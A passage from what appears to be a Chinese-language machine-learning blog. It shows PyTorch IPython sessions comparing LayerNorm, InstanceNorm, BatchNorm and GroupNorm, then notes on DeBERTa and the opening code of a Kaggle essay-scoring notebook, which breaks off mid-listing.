class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: x = torch.arange(<span class="number">2</span>*<span class="number">2</span>*<span class="number">2</span>*<span class="number">2</span>, dtype=torch.<span class="built_in">float</span>).reshape(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: x</span><br><span class="line">Out[<span class="number">4</span>]:</span><br><span class="line">tensor([[[[ <span class="number">0.</span>,  <span class="number">1.</span>],</span><br><span class="line">          [ <span class="number">2.</span>,  <span class="number">3.</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">4.</span>,  <span class="number">5.</span>],</span><br><span class="line">          [ <span class="number">6.</span>,  <span class="number">7.</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [[[ <span class="number">8.</span>,  <span class="number">9.</span>],</span><br><span class="line">          [<span class="number">10.</span>, <span class="number">11.</span>]],</span><br><span class="line"></span><br><span class="line">         [[<span class="number">12.</span>, <span class="number">13.</span>],</span><br><span class="line">          [<span class="number">14.</span>, <span class="number">15.</span>]]]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: layernorm = torch.nn.LayerNorm((<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: layernorm(x)</span><br><span class="line">Out[<span class="number">6</span>]:</span><br><span class="line">tensor([[[[-<span class="number">1.5275</span>, -<span class="number">1.0911</span>],</span><br><span class="line">          [-<span class="number">0.6547</span>, -<span class="number">0.2182</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">0.2182</span>,  <span class="number">0.6547</span>],</span><br><span class="line">          [ <span class="number">1.0911</span>,  <span class="number">1.5275</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [[[-<span class="number">1.5275</span>, -<span class="number">1.0911</span>],</span><br><span class="line">          [-<span class="number">0.6547</span>, -<span class="number">0.2182</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">0.2182</span>,  <span class="number">0.6547</span>],</span><br><span class="line">          [ <span class="number">1.0911</span>,  <span class="number">1.5275</span>]]]], grad_fn=&lt;NativeLayerNormBackward0&gt;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: mean = np.mean([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: std = np.std([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: norm = <span class="keyword">lambda</span> x:(x-mean)/std</span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]:</span><br><span class="line">    ...:     <span class="built_in">print</span>(norm(i), end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    ...:</span><br><span class="line">-<span class="number">1.5275252316519468</span>,-<span class="number">1.091089451179962</span>,-<span class="number">0.6546536707079772</span>,-<span class="number">0.2182178902359924</span>,<span class="number">0.2182178902359924</span>,<span class="number">0.6546536707079772</span>,<span class="number">1.091089451179962</span>,<span class="number">1.5275252316519468</span>,</span><br><span class="line">In [<span class="number">11</span>]: layernorm = torch.nn.LayerNorm((<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: layernorm(x)</span><br><span class="line">Out[<span class="number">12</span>]:</span><br><span class="line">tensor([[[[-<span class="number">1.3416</span>, -<span class="number">0.4472</span>],</span><br><span class="line">          [ <span class="number">0.4472</span>,  <span class="number">1.3416</span>]],</span><br><span class="line"></span><br><span class="line">         [[-<span class="number">1.3416</span>, -<span class="number">0.4472</span>],</span><br><span class="line">          [ <span class="number">0.4472</span>,  <span class="number">1.3416</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [[[-<span class="number">1.3416</span>, -<span class="number">0.4472</span>],</span><br><span class="line">          [ <span class="number">0.4472</span>,  <span class="number">1.3416</span>]],</span><br><span class="line"></span><br><span class="line">         [[-<span class="number">1.3416</span>, -<span class="number">0.4472</span>],</span><br><span class="line">          [ <span class="number">0.4472</span>,  <span class="number">1.3416</span>]]]], grad_fn=&lt;NativeLayerNormBackward0&gt;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: x</span><br><span class="line">Out[<span class="number">13</span>]:</span><br><span class="line">tensor([[[[ <span class="number">0.</span>,  <span class="number">1.</span>],</span><br><span class="line">          [ <span class="number">2.</span>,  <span class="number">3.</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">4.</span>,  <span class="number">5.</span>],</span><br><span class="line">          [ <span class="number">6.</span>,  <span class="number">7.</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [[[ <span class="number">8.</span>,  <span class="number">9.</span>],</span><br><span class="line">          [<span class="number">10.</span>, <span class="number">11.</span>]],</span><br><span class="line"></span><br><span class="line">         [[<span class="number">12.</span>, <span class="number">13.</span>],</span><br><span class="line">          [<span class="number">14.</span>, <span class="number">15.</span>]]]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: mean = np.mean([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: std = np.std([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]:</span><br><span class="line">    ...:     <span class="built_in">print</span>(norm(i), end=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    ...:</span><br><span class="line">-<span class="number">1.3416407864998738</span>, -<span class="number">0.4472135954999579</span>, <span class="number">0.4472135954999579</span>, <span class="number">1.3416407864998738</span>,</span><br></pre></td></tr></table></figure><h2 id="instancenorm">InstanceNorm</h2><p>就像刚刚介绍的, 类似于batchsize为1的BN. 即每次从batch里面取出一个instance, 然后锁Channel, 对HW做norm. 这个norm的作用主要是针对每一个不同的图片来做norm, 所以被运用来风格迁移上.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: x = torch.arange(<span class="number">2</span>*<span class="number">2</span>*<span class="number">2</span>*<span class="number">2</span>, dtype=torch.<span class="built_in">float</span>).reshape(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: x</span><br><span class="line">Out[<span class="number">4</span>]:</span><br><span class="line">tensor([[[[ <span class="number">0.</span>,  <span class="number">1.</span>],</span><br><span class="line">          [ <span class="number">2.</span>,  <span class="number">3.</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">4.</span>,  <span class="number">5.</span>],</span><br><span class="line">          [ <span class="number">6.</span>,  <span class="number">7.</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [[[ <span class="number">8.</span>,  <span class="number">9.</span>],</span><br><span class="line">          [<span class="number">10.</span>, <span class="number">11.</span>]],</span><br><span class="line"></span><br><span class="line">         [[<span class="number">12.</span>, <span class="number">13.</span>],</span><br><span class="line">          [<span class="number">14.</span>, <span class="number">15.</span>]]]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: instanceNorm = torch.nn.InstanceNorm2d(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: instanceNorm(x)</span><br><span class="line">Out[<span class="number">6</span>]:</span><br><span class="line">tensor([[[[-<span class="number">1.3416</span>, -<span class="number">0.4472</span>],</span><br><span class="line">          [ <span class="number">0.4472</span>,  <span class="number">1.3416</span>]],</span><br><span class="line"></span><br><span class="line">         [[-<span class="number">1.3416</span>, -<span class="number">0.4472</span>],</span><br><span class="line">          [ <span class="number">0.4472</span>,  <span class="number">1.3416</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [[[-<span class="number">1.3416</span>, -<span class="number">0.4472</span>],</span><br><span class="line">          [ <span class="number">0.4472</span>,  <span class="number">1.3416</span>]],</span><br><span class="line"></span><br><span class="line">         [[-<span class="number">1.3416</span>, -<span class="number">0.4472</span>],</span><br><span class="line">          [ <span class="number">0.4472</span>,  <span class="number">1.3416</span>]]]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: batchnorm = torch.nn.BatchNorm2d(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: batchnorm(x)</span><br><span class="line">Out[<span class="number">8</span>]:</span><br><span class="line">tensor([[[[-<span class="number">1.3242</span>, -<span class="number">1.0835</span>],</span><br><span class="line">          [-<span class="number">0.8427</span>, -<span class="number">0.6019</span>]],</span><br><span class="line"></span><br><span class="line">         [[-<span class="number">1.3242</span>, -<span class="number">1.0835</span>],</span><br><span class="line">          [-<span class="number">0.8427</span>, -<span class="number">0.6019</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [[[ <span class="number">0.6019</span>,  <span class="number">0.8427</span>],</span><br><span class="line">          [ <span class="number">1.0835</span>,  <span class="number">1.3242</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">0.6019</span>,  <span class="number">0.8427</span>],</span><br><span class="line">          [ <span class="number">1.0835</span>,  <span class="number">1.3242</span>]]]], grad_fn=&lt;NativeBatchNormBackward0&gt;)</span><br></pre></td></tr></table></figure><h2 id="groupnorm">GroupNorm</h2><p>介于InstanceNorm和LayerNorm中间, InstanceNorm是group为channel number的特例, 而layernorm为group为1的特例.</p><p>pytorch官方文档也写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">input</span> = torch.randn(<span class="number">20</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Separate 6 channels into 3 groups</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = nn.GroupNorm(<span class="number">3</span>, <span class="number">6</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Separate 6 channels into 6 groups (equivalent with InstanceNorm)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = nn.GroupNorm(<span class="number">6</span>, <span class="number">6</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Put all 6 channels into a single group (equivalent with LayerNorm)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = nn.GroupNorm(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Activating the module</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>output = m(<span class="built_in">input</span>)</span><br></pre></td></tr></table></figure><p>实例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: x = torch.arange(<span class="number">2</span>*<span class="number">4</span>*<span class="number">2</span>*<span class="number">2</span>, dtype=torch.<span class="built_in">float</span>).reshape(<span class="number">2</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: x</span><br><span class="line">Out[<span class="number">4</span>]:</span><br><span class="line">tensor([[[[ <span class="number">0.</span>,  <span class="number">1.</span>],</span><br><span class="line">          [ <span class="number">2.</span>,  <span class="number">3.</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">4.</span>,  <span class="number">5.</span>],</span><br><span class="line">          [ <span class="number">6.</span>,  <span class="number">7.</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">8.</span>,  <span class="number">9.</span>],</span><br><span class="line">          [<span class="number">10.</span>, <span class="number">11.</span>]],</span><br><span class="line"></span><br><span class="line">         [[<span class="number">12.</span>, <span class="number">13.</span>],</span><br><span class="line">          [<span class="number">14.</span>, <span class="number">15.</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [[[<span class="number">16.</span>, <span class="number">17.</span>],</span><br><span class="line">          [<span class="number">18.</span>, <span class="number">19.</span>]],</span><br><span class="line"></span><br><span class="line">         [[<span class="number">20.</span>, <span class="number">21.</span>],</span><br><span class="line">          [<span class="number">22.</span>, <span class="number">23.</span>]],</span><br><span class="line"></span><br><span class="line">         [[<span class="number">24.</span>, <span class="number">25.</span>],</span><br><span class="line">          [<span class="number">26.</span>, <span class="number">27.</span>]],</span><br><span class="line"></span><br><span class="line">         [[<span class="number">28.</span>, <span class="number">29.</span>],</span><br><span class="line">          [<span class="number">30.</span>, <span class="number">31.</span>]]]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: groupnorm = torch.nn.GroupNorm(<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: groupnorm(x)</span><br><span class="line">Out[<span class="number">6</span>]:</span><br><span class="line">tensor([[[[-<span class="number">1.5275</span>, -<span class="number">1.0911</span>],</span><br><span class="line">          [-<span class="number">0.6547</span>, -<span class="number">0.2182</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">0.2182</span>,  <span class="number">0.6547</span>],</span><br><span class="line">          [ <span class="number">1.0911</span>,  <span class="number">1.5275</span>]],</span><br><span class="line"></span><br><span class="line">         [[-<span class="number">1.5275</span>, -<span class="number">1.0911</span>],</span><br><span class="line">          [-<span class="number">0.6547</span>, -<span class="number">0.2182</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">0.2182</span>,  <span class="number">0.6547</span>],</span><br><span class="line">          [ <span class="number">1.0911</span>,  <span class="number">1.5275</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [[[-<span class="number">1.5275</span>, -<span class="number">1.0911</span>],</span><br><span class="line">          [-<span class="number">0.6547</span>, -<span class="number">0.2182</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">0.2182</span>,  <span class="number">0.6547</span>],</span><br><span class="line">          [ <span class="number">1.0911</span>,  <span class="number">1.5275</span>]],</span><br><span class="line"></span><br><span class="line">         [[-<span class="number">1.5275</span>, -<span class="number">1.0911</span>],</span><br><span class="line">          [-<span class="number">0.6547</span>, -<span class="number">0.2182</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">0.2182</span>,  <span class="number">0.6547</span>],</span><br><span class="line">          [ <span class="number">1.0911</span>,  <span class="number">1.5275</span>]]]], grad_fn=&lt;NativeGroupNormBackward0&gt;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: mean = np.mean(<span class="built_in">range</span>(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: std = np.std(<span class="built_in">range</span>(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: norm = <span class="keyword">lambda</span> x:(x-mean)/std</span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    ...:     <span class="built_in">print</span>(norm(i), end=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    ...:</span><br><span class="line">-<span class="number">1.5275252316519468</span>, -<span class="number">1.091089451179962</span>, -<span class="number">0.6546536707079772</span>, -<span class="number">0.2182178902359924</span>, <span class="number">0.2182178902359924</span>, <span class="number">0.6546536707079772</span>, <span class="number">1.091089451179962</span>, <span class="number">1.5275252316519468</span>,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DeBERTa+LGBM+FeatureEngineering学习</title>
      <link href="/2024/05/03/DeBERTa-LGBM-FeatureEngineering%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/05/03/DeBERTa-LGBM-FeatureEngineering%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>参考的notebook的地址: <a href="https://www.kaggle.com/code/qamarmath/deberta-lightgbm-for-automated-essay-scoring">DeBERTa &amp; LightGBM for Automated Essay Scoring</a>.</p><p>首先会简要学习一下deberta,然后会看下notebook里面是如何做feature engineering的.</p><h1 id="deberta">DeBERTa</h1><p>v1: <a href="https://arxiv.org/abs/2006.03654">DeBERTa: Decoding-enhanced BERT with Disentangled Attention</a></p><p>v3: <a href="https://arxiv.org/abs/2111.09543">DeBERTaV3: Improving DeBERTa using ELECTRA-Style Pre-Training with Gradient-Disentangled Embedding Sharing</a></p><p>其中v1主要对两个部分做了改进: 一个是Disentangled Attention, 另一个是Enhanced mask decoder, 然后文中还提及到了新的对抗训练改进.</p><h2 id="disentangled-attention">Disentangled Attention</h2><p>我们知道bert里面对embedding的处理是相加的方法</p><p><img src="bert_embedding.png" /></p><p>不同于bert一个词只有一个content embedding和一个position embedding, 求和即位词嵌入; DeBERTa中每个词都有两个vector表示,而position embedding也是relative embedding,然后token_i和token_j的cross attention就可以由四个部分组成: content -&gt; content, content -&gt; positon, position -&gt; content, position -&gt; position.</p><p><img src="disentangled_attention.png" /></p><p>然后后面具体的计算还挺复杂的, 不过说白了其实还是矩阵交叉, 有点类似之前看的ffm.</p><p><img src="cross_relationship.png" /></p><h2 id="enhanced-mask-decoder">Enhanced Mask Decoder</h2><p>前面讲到DeBERTa的attention用的是relative position,对比bert里面是input的时候直接加起来了,所以到这里其实deberta是缺少绝对位置信息的,可是绝对位置还是有用的,所以作者表示我们还是得加上绝对位置信息.</p><blockquote><p>The BERT model incorporates absolute positions in the input layer. In DeBERTa, we incorporate them right after all the Transformer layers but before the softmax layer for masked token prediction.</p></blockquote><p>所以说白了就是解码的时候(这里的解码个人感觉表示的其实是predict the masked word的意思)我们会加入absolute position来作为补充信息.</p><h2 id="scale-invariant-fine-tuningsift">SCALE INVARIANT FINE-TUNING(SIFT)</h2><p>对抗训练一般用来让模型更robust, 在nlp中比较合理的加入干扰的位置应该是在word embedding. 但是embedding本身范围并没有做normalization, 所以这里作者提出先对embedding做layernorm,然后再对embedding做干扰.</p><h1 id="deberta-feature-engineering-lgbm">DeBERTa + Feature Engineering + LGBM</h1><h2 id="import">import</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gc</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> Dataset</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModelForSequenceClassification, Trainer, TrainingArguments,DataCollatorWithPadding</span><br><span class="line"><span class="keyword">import</span> nltk</span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> Dataset</span><br><span class="line"><span class="keyword">from</span> glob <span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> polars <span class="keyword">as</span> pl</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> scipy.special <span class="keyword">import</span> softmax</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split, GridSearchCV, RandomizedSearchCV</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier, ExtraTreesClassifier, AdaBoostClassifier,GradientBoostingClassifier,BaggingClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression, Perceptron</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> LinearSVC</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB,MultinomialNB,ComplementNB</span><br><span class="line"><span class="keyword">from</span> sklearn.neural_network <span class="keyword">import</span> MLPClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> tree</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_extraction.text <span class="keyword">import</span> CountVectorizer,TfidfVectorizer</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> imblearn.ensemble <span class="keyword">import</span> BalancedBaggingClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> SelectFromModel</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_classification</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> confusion_matrix, ConfusionMatrixDisplay</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split, StratifiedKFold</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> confusion_matrix, ConfusionMatrixDisplay, f1_score</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> cohen_kappa_score</span><br><span class="line"><span class="keyword">from</span> lightgbm <span class="keyword">import</span> log_evaluation, early_stopping</span><br><span class="line"><span class="keyword">import</span> lightgbm <span class="keyword">as</span> lgb</span><br><span class="line">nltk.download(<span class="string">&#x27;wordnet&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="baseline-deberta">baseline DeBERTa</h2><p>写了一长串, MODEL_PATHS里面是作者已经训练好了的DeBERTa, load进来, 多模型预测丢prediction.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">MAX_LENGTH = <span class="number">1024</span></span><br><span class="line">TEST_DATA_PATH = <span class="string">&quot;/kaggle/input/learning-agency-lab-automated-essay-scoring-2/test.csv&quot;</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> Dataset</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> (</span><br><span class="line">    AutoTokenizer,</span><br><span class="line">    AutoModelForSequenceClassification,</span><br><span class="line">    